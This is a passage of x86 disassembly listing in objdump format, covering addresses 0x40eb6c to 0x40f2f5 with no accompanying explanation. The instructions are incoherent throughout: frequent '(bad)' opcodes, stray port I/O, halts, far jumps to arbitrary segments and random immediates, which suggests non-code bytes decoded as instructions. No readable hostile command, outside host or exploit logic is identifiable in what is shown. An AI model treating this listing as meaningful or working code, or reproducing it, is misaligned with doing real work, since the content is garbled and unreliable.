  40eb6c:	add    DWORD PTR [ebp-0x657ab28c],0xc397c98b
  40eb76:	(bad)  
  40eb77:	push   0x290f96f6
  40eb7c:	(bad)  
  40eb7d:	fisttp WORD PTR [ecx]
  40eb7f:	icebp  
  40eb80:	mov    al,ds:0xed96cc1f
  40eb85:	test   DWORD PTR [edi+ebx*8+0x19],edi
  40eb89:	inc    esi
  40eb8a:	mov    dl,0x5f
  40eb8c:	push   esp
  40eb8d:	pop    es
  40eb8e:	mov    edx,DWORD PTR [eax-0x586fa8be]
  40eb94:	repz ror dh,1
  40eb97:	ret    
  40eb98:	pop    edx
  40eb99:	mov    eax,ds:0x39ffad6c
  40eb9e:	pop    ecx
  40eb9f:	or     dl,BYTE PTR [edx]
  40eba1:	js     0x40ec22
  40eba3:	dec    ecx
  40eba4:	push   edx
  40eba6:	adc    BYTE PTR [eax],bl
  40eba8:	jnp    0x40eba0
  40ebaa:	mov    bl,0x39
  40ebac:	and    BYTE PTR [eax+ecx*2-0x2bec472f],bl
  40ebb3:	call   0x38ddd9c3
  40ebb8:	xor    edx,ebp
  40ebba:	and    BYTE PTR [edi],ch
  40ebbc:	pop    esp
  40ebbd:	inc    ecx
  40ebbe:	dec    ecx
  40ebbf:	mov    dl,0x2
  40ebc1:	ret    
  40ebc2:	inc    edx
  40ebc3:	xor    ch,al
  40ebc5:	jns    0x40ec36
  40ebc7:	outs   dx,DWORD PTR es:[esi]
  40ebc9:	pop    ds
  40ebca:	or     eax,0x9a76dbab
  40ebcf:	int3   
  40ebd0:	jge    0x40eb76
  40ebd2:	shr    BYTE PTR [eax+0x15],0xc6
  40ebd6:	inc    eax
  40ebd7:	xchg   ecx,eax
  40ebd8:	int3   
  40ebd9:	stc    
  40ebda:	arpl   WORD PTR [ecx-0x6d],bp
  40ebdd:	jns    0x40eb7c
  40ebdf:	jmp    0xea8:0x89a6b91c
  40ebe6:	cmp    BYTE PTR [eax+0x539b091c],al
  40ebec:	stc    
  40ebed:	rcl    BYTE PTR [edx+0x7db035f8],0x84
  40ebf4:	mov    BYTE PTR [eax-0x28],0x18
  40ebf8:	mov    al,ds:0x1bf20edd
  40ebfd:	mov    ds,WORD PTR [ecx+edx*4]
  40ec00:	out    0x11,al
  40ec02:	mov    ch,ah
  40ec04:	sar    DWORD PTR [edx],cl
  40ec06:	pop    ecx
  40ec07:	or     al,BYTE PTR [ebp+0x3a]
  40ec0a:	xor    dl,bl
  40ec0c:	imul   edx,DWORD PTR [eax],0x3e
  40ec0f:	inc    eax
  40ec10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec11:	out    dx,eax
  40ec12:	mov    DWORD PTR [ebx],ebp
  40ec14:	push   esp
  40ec15:	icebp  
  40ec16:	pushf  
  40ec17:	fstp   TBYTE PTR [ebx]
  40ec19:	or     DWORD PTR [eax-0x24],ebx
  40ec1c:	sub    dh,BYTE PTR [edi+ecx*1]
  40ec1f:	shl    BYTE PTR [ebp+0x61],1
  40ec22:	and    eax,0xa8835395
  40ec27:	sbb    BYTE PTR ds:0x5204b13a,cl
  40ec2d:	push   esi
  40ec2e:	xchg   BYTE PTR [eax-0x3],dl
  40ec31:	mov    cl,0xca
  40ec33:	push   ss
  40ec34:	fcmovnb st,st(4)
  40ec36:	pop    esp
  40ec37:	push   0x53
  40ec39:	daa    
  40ec3a:	aas    
  40ec3b:	sub    cl,BYTE PTR [ebx]
  40ec3d:	push   esi
  40ec3e:	(bad)  
  40ec3f:	lea    ebx,[eax-0x6ed0e3a8]
  40ec45:	fidivr DWORD PTR [esi+0x5af761fe]
  40ec4b:	imul   ebx,DWORD PTR cs:[ebp-0x1f],0xd2d28195
  40ec53:	pop    es
  40ec54:	icebp  
  40ec55:	pop    eax
  40ec56:	push   0x18
  40ec58:	and    eax,0xefa0a430
  40ec5d:	lods   eax,DWORD PTR ds:[esi]
  40ec5e:	repz sbb BYTE PTR [ebx+0x25],0xfa
  40ec63:	jne    0x40ec9f
  40ec65:	jns    0x40ec57
  40ec67:	pusha  
  40ec68:	data16 test al,0xe4
  40ec6b:	out    0x3a,al
  40ec6d:	sub    ah,BYTE PTR [esi]
  40ec6f:	cmp    ch,BYTE PTR [ebp-0x2b]
  40ec72:	mov    ch,0x22
  40ec74:	cmp    DWORD PTR [esi+0x19c9cab8],esp
  40ec7a:	inc    ebx
  40ec7b:	dec    ebx
  40ec7c:	xor    bl,BYTE PTR [eax+0x65]
  40ec7f:	jns    0x40ecd4
  40ec81:	lds    edx,FWORD PTR [ebx]
  40ec83:	cmp    edi,eax
  40ec85:	frstor [ebx+0x41b90bd2]
  40ec8b:	push   0xc16258d4
  40ec90:	mov    BYTE PTR ds:0x8e5c7244,bh
  40ec96:	hlt    
  40ec97:	ja     0x40ec32
  40ec99:	sahf   
  40ec9a:	ret    0xb782
  40ec9d:	mov    al,ss:0x67ab35a6
  40eca3:	dec    eax
  40eca4:	sbb    DWORD PTR [esi+0x4bd358c9],0xffffffea
  40ecab:	pushf  
  40ecac:	shl    DWORD PTR [ebp-0x7d81c6ba],cl
  40ecb2:	sub    eax,0xec12165b
  40ecb7:	and    al,0x35
  40ecb9:	pop    esi
  40ecba:	adc    ebp,ebx
  40ecbc:	fmul   QWORD PTR [esi+edx*2]
  40ecbf:	mov    edi,0x9ecbbaa
  40ecc4:	and    ebp,DWORD PTR [ebp+0x54d8b1f3]
  40ecca:	popa   
  40eccb:	popf   
  40eccc:	popa   
  40eccd:	mov    esp,0x101457b5
  40ecd2:	dec    edi
  40ecd3:	xor    bh,dl
  40ecd5:	ins    DWORD PTR es:[edi],dx
  40ecd6:	pusha  
  40ecd7:	jae    0x40ecc1
  40ecd9:	leave  
  40ecda:	xchg   esi,eax
  40ecdb:	mov    esi,0xadf00fda
  40ece0:	push   esp
  40ece1:	mov    edi,0xbefe8428
  40ece6:	test   al,0x68
  40ece8:	push   0x41ef0a20
  40eced:	xchg   bx,ax
  40ecef:	push   ebx
  40ecf0:	lea    edx,[ebp+0x5]
  40ecf3:	enter  0x7265,0xb2
  40ecf7:	stc    
  40ecf8:	mov    ebx,0xcb2d4e7e
  40ecfd:	imul   BYTE PTR [edi-0x3f]
  40ed00:	ss adc ebx,edi
  40ed03:	cmp    al,0xa9
  40ed05:	scas   eax,DWORD PTR es:[edi]
  40ed06:	shr    DWORD PTR [ecx+edx*1],cl
  40ed09:	mov    ebx,0x6d74b89f
  40ed0e:	fs mov cl,0x7c
  40ed11:	mov    esi,0x63c55637
  40ed16:	sub    al,BYTE PTR [ecx+0x6a]
  40ed19:	aam    0x3b
  40ed1b:	mov    es,WORD PTR [edx]
  40ed1d:	lock xchg edi,eax
  40ed1f:	mov    al,0xe1
  40ed21:	aas    
  40ed22:	cmp    ebp,0xffffff94
  40ed25:	popf   
  40ed26:	cmp    eax,0x1dd703b3
  40ed2b:	dec    esp
  40ed2c:	out    0x76,eax
  40ed2e:	lahf   
  40ed2f:	cwde   
  40ed30:	jl     0x40ed6c
  40ed32:	sub    DWORD PTR [ecx-0x10cd3e82],edi
  40ed38:	mov    dl,0x8c
  40ed3a:	adc    bh,BYTE PTR [ecx-0x37a370df]
  40ed40:	jae    0x40ed79
  40ed42:	int    0x8e
  40ed44:	shl    DWORD PTR [esi-0x28],0x8b
  40ed48:	mov    esp,0x5a591c7f
  40ed4d:	cmp    BYTE PTR [ebx+0x31],ch
  40ed50:	in     al,0x2f
  40ed52:	in     eax,0xbc
  40ed54:	jle    0x40edcb
  40ed56:	dec    esi
  40ed57:	std    
  40ed58:	jnp    0x40ed2b
  40ed5a:	pop    ss
  40ed5b:	(bad)  
  40ed5c:	fild   QWORD PTR [ebp+0x47285e4f]
  40ed62:	cs sbb al,0x5d
  40ed65:	pusha  
  40ed66:	test   BYTE PTR [eax+0x4066423b],bh
  40ed6c:	push   edi
  40ed6d:	loop   0x40ed84
  40ed6f:	mov    esi,0x277977cc
  40ed74:	dec    ebp
  40ed75:	fcomp  QWORD PTR [edx+0x7f4b2844]
  40ed7b:	adc    bh,BYTE PTR [ebx+eax*1+0x3f4d9e3a]
  40ed82:	mov    bh,0x1d
  40ed84:	pusha  
  40ed85:	and    ah,BYTE PTR [ecx-0x21]
  40ed88:	dec    esi
  40ed89:	xchg   ebp,eax
  40ed8a:	hlt    
  40ed8b:	(bad)  
  40ed8c:	mov    dh,0x17
  40ed8e:	pop    edi
  40ed8f:	inc    ecx
  40ed90:	and    DWORD PTR [ebp-0xf],edx
  40ed93:	xchg   DWORD PTR [ecx+0x74],esp
  40ed96:	pop    ebx
  40ed97:	xchg   edx,eax
  40ed98:	std    
  40ed99:	stos   BYTE PTR es:[edi],al
  40ed9a:	jge    0x40ed98
  40ed9c:	jne    0x40ed9a
  40ed9e:	fisttp WORD PTR [esi+0x1bb9b198]
  40eda4:	mov    bl,0x69
  40eda6:	mov    ds:0x734d838d,eax
  40edab:	mov    dh,0xb6
  40edad:	jmp    0x40ed7f
  40edaf:	pop    eax
  40edb0:	pop    es
  40edb1:	ficomp DWORD PTR [ebx]
  40edb3:	adc    cl,BYTE PTR [edi-0x49d6a3f3]
  40edb9:	nop
  40edba:	loop   0x40ee34
  40edbc:	cmp    esi,0xa
  40edbf:	rcr    BYTE PTR [ebx-0x28da39cb],0xa0
  40edc6:	call   0x8c48bc37
  40edcb:	sbb    eax,0x1c26e4aa
  40edd0:	test   BYTE PTR [ebx],al
  40edd2:	sbb    ebp,eax
  40edd4:	pop    ds
  40edd5:	nop
  40edd6:	mov    DWORD PTR ds:0x3d9c900b,esp
  40eddc:	stos   BYTE PTR es:[edi],al
  40eddd:	(bad)
  40ede1:	xor    al,0x2
  40ede3:	popa   
  40ede4:	fisttp QWORD PTR [edi]
  40ede6:	xor    BYTE PTR [eax+0x46],ah
  40ede9:	ret    
  40edea:	pushf  
  40edeb:	out    dx,eax
  40edec:	mov    dl,dl
  40edee:	pop    eax
  40edef:	dec    ebx
  40edf0:	jo     0x40ee26
  40edf2:	cmp    dh,0x45
  40edf5:	push   esi
  40edf6:	arpl   sp,dx
  40edf8:	inc    ebp
  40edf9:	jmp    0x87455029
  40edfe:	out    0xaa,eax
  40ee00:	cli    
  40ee01:	and    cl,BYTE PTR [ecx+0x279b6c73]
  40ee07:	pop    eax
  40ee08:	ss add eax,0x4a238415
  40ee0e:	je     0x40edee
  40ee10:	into   
  40ee11:	and    esp,eax
  40ee13:	mov    ah,BYTE PTR [ebp*4+0x7e3c81f3]
  40ee1a:	(bad)
  40ee1d:	cdq    
  40ee1e:	in     al,0x20
  40ee20:	hlt    
  40ee21:	(bad)  
  40ee22:	stc    
  40ee23:	(bad)  
  40ee24:	and    ah,BYTE PTR [ebx+eax*2]
  40ee27:	mov    eax,0xaca73f9
  40ee2c:	xor    al,0x68
  40ee2e:	outs   dx,DWORD PTR ds:[esi]
  40ee2f:	or     DWORD PTR [edx+ecx*4-0x1b70f2a6],0x957d7d5f
  40ee3a:	sbb    DWORD PTR [ebx-0x76],eax
  40ee3d:	dec    ebp
  40ee3e:	xchg   ebx,eax
  40ee3f:	sub    al,0xa5
  40ee41:	ins    BYTE PTR es:[edi],dx
  40ee42:	mov    ds:0xb5a96182,al
  40ee47:	cwde   
  40ee48:	cmp    DWORD PTR [ecx],ecx
  40ee4a:	(bad)  
  40ee4b:	push   esp
  40ee4c:	fwait
  40ee4d:	test   DWORD PTR [edx-0x7651967c],edi
  40ee53:	fcomi  st,st(6)
  40ee55:	mov    gs,edx
  40ee57:	or     eax,0xc320fe65
  40ee5c:	add    eax,0x46cc9639
  40ee61:	add    BYTE PTR [ebx],cl
  40ee63:	bswap  edi
  40ee65:	push   0xfffffff9
  40ee67:	xor    al,0x16
  40ee69:	(bad)  
  40ee6b:	scas   eax,DWORD PTR es:[edi]
  40ee6c:	cmp    eax,0x45078a71
  40ee71:	mov    ebp,0x37884168
  40ee76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee77:	mov    al,ds:0xde1d7222
  40ee7c:	fstp   DWORD PTR [ecx+0x9]
  40ee7f:	xor    al,ch
  40ee81:	cmp    al,0x68
  40ee83:	or     DWORD PTR [edx-0x32],eax
  40ee86:	jle    0x40eea3
  40ee88:	mov    bl,0xeb
  40ee8a:	leave  
  40ee8b:	inc    edx
  40ee8c:	push   ecx
  40ee8d:	adc    ah,BYTE PTR [ebp+0x5d84dcb0]
  40ee93:	jno    0x40eee1
  40ee95:	icebp  
  40ee96:	mov    eax,0xbc117b9b
  40ee9b:	sub    DWORD PTR [ebp-0x69],edi
  40ee9e:	scas   eax,DWORD PTR es:[edi]
  40ee9f:	jg     0x40ee33
  40eea1:	inc    ebx
  40eea2:	je     0x40ee53
  40eea4:	xor    edx,DWORD PTR [ebp-0x78]
  40eea7:	outs   dx,DWORD PTR ds:[esi]
  40eea8:	mov    ds:0x896ee92f,al
  40eead:	ret    0xf269
  40eeb0:	adc    al,0xa5
  40eeb2:	gs dec esi
  40eeb4:	jmp    0xc1d5c412
  40eeb9:	call   0xd1a9:0x7f843ce4
  40eec0:	sbb    esp,DWORD PTR [edi-0x18c7ef0a]
  40eec6:	xchg   esp,eax
  40eec7:	clc    
  40eec8:	loope  0x40ee74
  40eeca:	ror    DWORD PTR [eax+0x462a442e],0xd7
  40eed1:	or     eax,0x3e6c09ec
  40eed6:	push   0x2de0f158
  40eedb:	sub    al,0xe3
  40eedd:	push   cs
  40eede:	in     al,0xa
  40eee0:	and    al,0x92
  40eee2:	jb     0x40ee69
  40eee4:	int    0x54
  40eee6:	fmul   st(4),st
  40eee8:	mov    cl,BYTE PTR [eax-0x3b06c291]
  40eeee:	fwait
  40eeef:	add    DWORD PTR [eax],edi
  40eef1:	mov    ds:0xf5c46bac,eax
  40eef6:	mov    edx,0xfe65b6a5
  40eefb:	push   0xffffff89
  40eefd:	jbe    0x40eede
  40eeff:	push   ss
  40ef00:	push   esp
  40ef01:	and    DWORD PTR [esi],ebx
  40ef03:	dec    edi
  40ef04:	dec    eax
  40ef05:	fs loopne 0x40ee9e
  40ef08:	shl    DWORD PTR [edi-0x1c],cl
  40ef0b:	mov    al,ds:0x60aa1c92
  40ef10:	dec    esi
  40ef11:	jl     0x40ef4f
  40ef13:	mov    esp,0xb8520db7
  40ef18:	add    ah,BYTE PTR [ecx+0x2]
  40ef1b:	and    al,0x2a
  40ef1d:	add    bh,al
  40ef1f:	shl    DWORD PTR [eax+0x14],0x71
  40ef23:	push   eax
  40ef24:	pop    ebx
  40ef25:	dec    esi
  40ef26:	je     0x40ef46
  40ef28:	pop    ebx
  40ef29:	jl     0x40ef93
  40ef2b:	loopne 0x40eeb7
  40ef2d:	add    al,0xd6
  40ef2f:	dec    edi
  40ef30:	in     eax,dx
  40ef31:	push   es
  40ef32:	dec    ebp
  40ef33:	sub    BYTE PTR [esi+eiz*4-0x20],al
  40ef37:	lahf   
  40ef38:	call   0x9232:0xc07a5b8a
  40ef3f:	mov    dl,BYTE PTR [ebx+0x471b7e67]
  40ef45:	push   edx
  40ef46:	xor    esi,DWORD PTR [esi]
  40ef48:	in     al,0x15
  40ef4a:	sub    al,0x43
  40ef4c:	(bad)  
  40ef4d:	mov    DWORD PTR cs:[ebx-0x50acf9e4],ecx
  40ef54:	stos   DWORD PTR es:[edi],eax
  40ef55:	popa   
  40ef56:	jle    0x40eee7
  40ef58:	jp     0x40ef88
  40ef5a:	outs   dx,BYTE PTR ds:[esi]
  40ef5b:	mov    ecx,cs
  40ef5d:	jp     0x40ef9a
  40ef5f:	in     eax,dx
  40ef60:	push   esp
  40ef61:	sti    
  40ef62:	adc    ch,BYTE PTR [edx]
  40ef64:	mov    BYTE PTR [ebx-0x1c15b0f7],dh
  40ef6a:	arpl   WORD PTR [esi-0x5513c582],si
  40ef70:	enter  0xaf49,0xe2
  40ef74:	stos   BYTE PTR es:[edi],al
  40ef75:	jnp    0x40ef65
  40ef77:	dec    edi
  40ef78:	dec    ebx
  40ef79:	(bad)  
  40ef7a:	popw   ds
  40ef7c:	mov    cl,0x83
  40ef7e:	jle    0x40efaf
  40ef80:	jecxz  0x40ef0a
  40ef82:	jmp    0x40efc9
  40ef84:	cmp    BYTE PTR [edi],bh
  40ef86:	push   ds
  40ef87:	cmp    eax,0xbbbbef23
  40ef8c:	pop    ds
  40ef8d:	fsubr  st,st(0)
  40ef8f:	sub    al,0xfe
  40ef91:	sti    
  40ef92:	adc    DWORD PTR [edi+0x4a63fe5e],esi
  40ef98:	fs xor edx,esp
  40ef9b:	add    ch,dl
  40ef9d:	fidiv  DWORD PTR [edx-0x36aab3]
  40efa3:	neg    DWORD PTR ds:0x7a873694
  40efa9:	jb     0x40ef90
  40efab:	loope  0x40ef6c
  40efad:	cli    
  40efae:	mov    ds:0x27bbc3e5,eax
  40efb3:	or     edx,DWORD PTR [edi+0x16035747]
  40efb9:	jmp    0x629f:0x5619462d
  40efc0:	test   edi,esp
  40efc2:	cs push 0x5038a379
  40efc8:	stc    
  40efc9:	fiadd  DWORD PTR [esi+0x32]
  40efcc:	dec    edi
  40efcd:	sub    ebp,ebx
  40efcf:	fs or  ebx,ebx
  40efd2:	ins    DWORD PTR es:[edi],dx
  40efd3:	inc    eax
  40efd4:	std    
  40efd5:	mov    es:0x1fe59a33,al
  40efdb:	push   esp
  40efdc:	pushf  
  40efdd:	ins    BYTE PTR es:[edi],dx
  40efde:	mov    ebp,DWORD PTR ds:0x2225b379
  40efe4:	scas   eax,DWORD PTR es:[edi]
  40efe5:	adc    BYTE PTR [esi+0x5b66e1b1],cl
  40efeb:	fistp  QWORD PTR [ebp-0x2d]
  40efee:	and    al,0x76
  40eff0:	sahf   
  40eff1:	inc    esp
  40eff2:	(bad)  
  40eff3:	jbe    0x40efec
  40eff5:	push   ds
  40eff6:	cwde   
  40eff7:	popf   
  40eff8:	mov    dh,0x59
  40effa:	sub    ch,bh
  40effc:	lock push ds
  40effe:	fisub  DWORD PTR [edx+0x7c0c0a92]
  40f004:	add    BYTE PTR [ebx+0x8],al
  40f007:	xlat   BYTE PTR ds:[ebx]
  40f008:	fstp   DWORD PTR [ebp-0x57d176ae]
  40f00e:	jg     0x40f05a
  40f010:	loop   0x40f00f
  40f012:	jl     0x40efbb
  40f014:	enter  0xc524,0xd4
  40f018:	push   cs
  40f019:	pop    edx
  40f01a:	loopne 0x40efbf
  40f01c:	push   ecx
  40f01d:	xor    DWORD PTR [ebx],ecx
  40f01f:	shl    DWORD PTR gs:[ebx+eax*2+0x6b],0x45
  40f025:	inc    ebx
  40f026:	retf   0xac86
  40f029:	pop    ebx
  40f02a:	iret   
  40f02b:	mov    BYTE PTR [edi],ah
  40f02d:	nop
  40f02e:	enter  0x961f,0x31
  40f032:	jmp    0xf5325967
  40f037:	push   esp
  40f038:	jo     0x40f07e
  40f03a:	lea    edi,[esi]
  40f03c:	xlat   BYTE PTR ds:[ebx]
  40f03d:	in     al,0x28
  40f03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f040:	mov    eax,0xb5f50118
  40f045:	xlat   BYTE PTR ds:[ebx]
  40f046:	and    DWORD PTR [ebx+0x79b6bdb0],edi
  40f04c:	sbb    cl,BYTE PTR [edi]
  40f04e:	retf   0xc421
  40f051:	int    0x6b
  40f053:	mov    esp,0xf65ef0b3
  40f058:	mov    ds:0x7e17910a,eax
  40f05d:	jo     0x40eff4
  40f05f:	(bad)  [edi+0xa]
  40f062:	mov    dh,0xd6
  40f064:	test   eax,0x1ecba003
  40f069:	sub    al,0x5d
  40f06b:	arpl   si,cx
  40f06d:	imul   esi,DWORD PTR [ecx+ecx*8+0x1764953e],0xffffffb3
  40f075:	push   cs
  40f076:	rol    DWORD PTR [eax],cl
  40f078:	push   esp
  40f079:	div    ch
  40f07b:	sbb    al,0x3c
  40f07d:	(bad)  
  40f07e:	out    dx,eax
  40f07f:	jmp    0x9a3f84b6
  40f084:	in     al,0x8a
  40f086:	pop    esp
  40f087:	out    dx,al
  40f088:	xchg   DWORD PTR [edi-0x5c],esi
  40f08b:	ss pop edx
  40f08d:	fs int3 
  40f08f:	add    BYTE PTR [eax-0x77],al
  40f092:	mov    cl,0x5a
  40f094:	sub    ebp,DWORD PTR [edi+0x20]
  40f097:	lods   eax,DWORD PTR ds:[esi]
  40f098:	sti    
  40f099:	xor    esp,DWORD PTR [ecx-0x2d]
  40f09c:	inc    esp
  40f09d:	stos   DWORD PTR es:[edi],eax
  40f09e:	aas    
  40f09f:	or     edi,esp
  40f0a1:	loopne 0x40f066
  40f0a3:	sti    
  40f0a4:	inc    ecx
  40f0a5:	je     0x40f121
  40f0a7:	das    
  40f0a8:	adc    ah,dh
  40f0aa:	pop    ebp
  40f0ab:	lods   eax,DWORD PTR ds:[esi]
  40f0ac:	and    eax,0x1e004965
  40f0b1:	mov    eax,ds:0xc32bb9a0
  40f0b6:	xlat   BYTE PTR ds:[ebx]
  40f0b7:	in     eax,dx
  40f0b8:	mov    eax,DWORD PTR [eax-0x35]
  40f0bb:	inc    esi
  40f0bc:	lea    ebx,[esp+ebp*4]
  40f0bf:	or     edx,DWORD PTR [ebx+0x12]
  40f0c2:	sbb    eax,0x8cee4a14
  40f0c7:	pop    ebp
  40f0c8:	dec    eax
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	(bad)  
  40f0cc:	popa   
  40f0cd:	mov    ds:0xc6e30669,eax
  40f0d2:	add    BYTE PTR [edx+ecx*4-0x7b],0x5e
  40f0d7:	pop    ss
  40f0d8:	retf   
  40f0d9:	mov    al,0x98
  40f0db:	add    bl,dl
  40f0dd:	pop    eax
  40f0de:	stc    
  40f0df:	mov    ebp,0xc6542275
  40f0e4:	push   ds
  40f0e5:	retf   0xfeee
  40f0e8:	sbb    cl,dl
  40f0ea:	xor    edi,esi
  40f0ec:	sbb    bl,dh
  40f0ee:	call   0xe9b7:0xe12475d8
  40f0f5:	(bad)  
  40f0f6:	mov    cl,0x97
  40f0f8:	loop   0x40f11c
  40f0fa:	xchg   edx,eax
  40f0fb:	frstor [edi+0x6b]
  40f0fe:	in     eax,dx
  40f0ff:	dec    ebp
  40f100:	adc    BYTE PTR [edi-0x24c8e833],al
  40f106:	jns    0x40f175
  40f108:	inc    ebp
  40f109:	jo     0x40f132
  40f10b:	sbb    eax,0x1169480d
  40f110:	(bad)  
  40f111:	jae    0x40f14c
  40f113:	push   edx
  40f114:	je     0x40f0b0
  40f116:	in     al,dx
  40f117:	inc    DWORD PTR [ebx]
  40f119:	xchg   ebx,eax
  40f11a:	dec    ebp
  40f11b:	icebp  
  40f11c:	xor    ebx,DWORD PTR [edi-0x4bca5486]
  40f122:	(bad)  
  40f123:	dec    edx
  40f124:	dec    esp
  40f125:	popa   
  40f126:	ja     0x40f16f
  40f128:	jmp    0x7e481171
  40f12d:	shl    BYTE PTR [ecx-0x3a040c59],0x3e
  40f134:	test   DWORD PTR [ebp+ebx*4+0xf9c9d01],ecx
  40f13b:	mov    ah,0x9f
  40f13d:	mov    ds:0xc398b642,eax
  40f142:	cdq    
  40f143:	add    eax,0xc42f81d3
  40f148:	inc    eax
  40f149:	mov    bl,0x70
  40f14b:	jno    0x40f168
  40f14d:	mov    al,0xae
  40f14f:	fcom   st(0)
  40f151:	jb     0x40f1b3
  40f153:	mov    al,0x53
  40f155:	dec    esi
  40f156:	push   cs
  40f157:	or     eax,0x37f123ad
  40f15c:	fnsetpm(287 only) 
  40f15e:	pop    edi
  40f15f:	shl    BYTE PTR [edx-0x25edfc4c],cl
  40f165:	jnp    0x40f11f
  40f167:	(bad)  
  40f168:	fadd   DWORD PTR [eax-0x76]
  40f16b:	ins    BYTE PTR es:[edi],dx
  40f16c:	inc    esp
  40f16d:	inc    ebp
  40f16e:	jnp    0x40f172
  40f170:	into   
  40f171:	outs   dx,BYTE PTR ds:[esi]
  40f172:	and    eax,0x52665dc
  40f177:	jmp    0x4d28:0x77c2fe18
  40f17e:	sbb    ebp,eax
  40f180:	lods   eax,DWORD PTR ds:[esi]
  40f181:	push   es
  40f182:	xor    al,0xbf
  40f184:	jecxz  0x40f128
  40f186:	and    BYTE PTR [esi],bh
  40f188:	and    cl,BYTE PTR [ebp-0x5b8f33e]
  40f18e:	sbb    bh,BYTE PTR [eax]
  40f190:	outs   dx,BYTE PTR ds:[esi]
  40f191:	adc    eax,0xcb07ab9d
  40f196:	xor    DWORD PTR [ebx+edx*8],esp
  40f199:	in     eax,dx
  40f19a:	pop    ds
  40f19b:	pop    edx
  40f19c:	scas   eax,DWORD PTR es:[edi]
  40f19d:	lods   al,BYTE PTR ds:[esi]
  40f19e:	mov    bl,0x5f
  40f1a0:	in     al,dx
  40f1a1:	cld    
  40f1a2:	dec    edi
  40f1a3:	sbb    dl,BYTE PTR [edx-0x73de14cf]
  40f1a9:	or     cl,BYTE PTR [edx-0x4399ebff]
  40f1af:	call   0x1c24e3aa
  40f1b4:	arpl   WORD PTR [edi-0x3287eac0],cx
  40f1ba:	je     0x40f20c
  40f1bc:	fild   QWORD PTR cs:[edx-0x80]
  40f1c0:	sub    bh,BYTE PTR [edx-0x37]
  40f1c3:	das    
  40f1c4:	pop    edi
  40f1c5:	loop   0x40f14d
  40f1c7:	(bad)  
  40f1c8:	repnz lods eax,DWORD PTR ds:[esi]
  40f1ca:	shl    edi,1
  40f1cc:	es (bad) 
  40f1ce:	sub    BYTE PTR [edx-0x33330271],dl
  40f1d4:	pop    ebx
  40f1d5:	das    
  40f1d6:	inc    ebx
  40f1d7:	push   ebp
  40f1d8:	fst    DWORD PTR ds:0xd58adf36
  40f1de:	mov    edi,0x789c1bc5
  40f1e3:	js     0x40f23b
  40f1e5:	mov    edx,0xf7fb1459
  40f1ea:	pop    es
  40f1eb:	addr16 cwde 
  40f1ed:	pop    ecx
  40f1ee:	dec    eax
  40f1ef:	jo     0x40f1f4
  40f1f1:	cmp    edx,DWORD PTR [edi]
  40f1f3:	gs test ebx,ebx
  40f1f6:	pop    ds
  40f1f7:	mov    cl,0x5f
  40f1f9:	xchg   DWORD PTR [edi-0x6aa69639],eax
  40f1ff:	adc    bh,bl
  40f201:	cdq    
  40f202:	jecxz  0x40f19b
  40f204:	xor    BYTE PTR [ebx],ch
  40f206:	jae    0x40f24d
  40f208:	out    dx,eax
  40f209:	lea    ebp,[ecx+0x2353359d]
  40f20f:	push   es
  40f210:	ret    
  40f211:	or     ch,bh
  40f213:	add    bh,BYTE PTR [ebp+0x48]
  40f216:	aas    
  40f217:	jb     0x40f254
  40f219:	out    dx,eax
  40f21a:	sub    al,0x28
  40f21c:	aam    0x92
  40f21e:	test   eax,0x9e0c8dec
  40f223:	push   edx
  40f224:	icebp  
  40f225:	ret    0x9f12
  40f228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f229:	adc    al,0xb7
  40f22b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f22c:	gs xchg edx,eax
  40f22e:	pop    esi
  40f22f:	inc    ebx
  40f230:	jle    0x40f29d
  40f232:	mov    DWORD PTR [ebx-0x70c3f88d],edx
  40f238:	cmp    DWORD PTR [eax+0x6560634f],ebx
  40f23e:	mov    dl,BYTE PTR [edx-0x2c]
  40f241:	jmp    0x2098af61
  40f246:	js     0x40f2a5
  40f248:	or     al,0x1f
  40f24a:	and    DWORD PTR [ecx+0x2022a77c],0xffffffe0
  40f251:	pop    ss
  40f252:	mov    ebp,0xd466234e
  40f257:	push   ecx
  40f258:	mov    ds:0x97ce923f,al
  40f25d:	mov    DWORD PTR [edx],esp
  40f25f:	enter  0xe977,0x8
  40f263:	sbb    DWORD PTR [esi],0x54
  40f266:	popa   
  40f267:	mov    ch,0x89
  40f269:	fwait
  40f26a:	int    0xfa
  40f26c:	sahf   
  40f26d:	mov    al,0x4b
  40f26f:	fldenv [eax-0x26c873f7]
  40f275:	das    
  40f276:	xchg   BYTE PTR [ecx],cl
  40f278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f279:	sbb    al,0x14
  40f27b:	mov    ds:0x185f07ec,al
  40f280:	imul   esi,DWORD PTR [esi+0x51d0698e],0x0
  40f287:	sub    eax,0xdbbe352d
  40f28c:	or     BYTE PTR [ecx-0x62ecc37a],al
  40f292:	in     eax,0x52
  40f294:	sbb    edi,DWORD PTR [ecx-0x28592771]
  40f29a:	pushf  
  40f29b:	ja     0x40f29f
  40f29d:	mov    al,ds:0x60a47af4
  40f2a2:	(bad)  
  40f2a4:	fstp   DWORD PTR [esp+ecx*8-0x1d83a8d3]
  40f2ab:	inc    esi
  40f2ac:	push   ds
  40f2ad:	adc    dl,BYTE PTR ds:0x9c8290d7
  40f2b3:	cli    
  40f2b4:	pop    ss
  40f2b5:	dec    ebp
  40f2b6:	shl    DWORD PTR [edx+0x47385647],1
  40f2bc:	mov    WORD PTR [ebx-0x1],fs
  40f2bf:	jle    0x40f243
  40f2c1:	xor    DWORD PTR [edi-0x3cbc4f7f],edx
  40f2c7:	in     eax,0x7b
  40f2c9:	add    bl,BYTE PTR [ebp-0x77]
  40f2cc:	and    DWORD PTR [ebp-0x5f4e6c0d],eax
  40f2d2:	sar    BYTE PTR [esi-0x78],1
  40f2d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d6:	fisub  WORD PTR [esi+ebx*4]
  40f2d9:	fstp   QWORD PTR [ecx+0x6c]
  40f2dc:	cs jno 0x40f29e
  40f2df:	fisttp DWORD PTR [ebx-0x301487ea]
  40f2e5:	and    edi,DWORD PTR [ecx+0x44211748]
  40f2eb:	arpl   WORD PTR [ecx],bx
  40f2ed:	fiadd  DWORD PTR [esi+eax*2]
  40f2f0:	leave  
  40f2f1:	inc    ebx
  40f2f2:	jmp    0x40f2ca
  40f2f4:	lahf   
  40f2f5:	icebp  
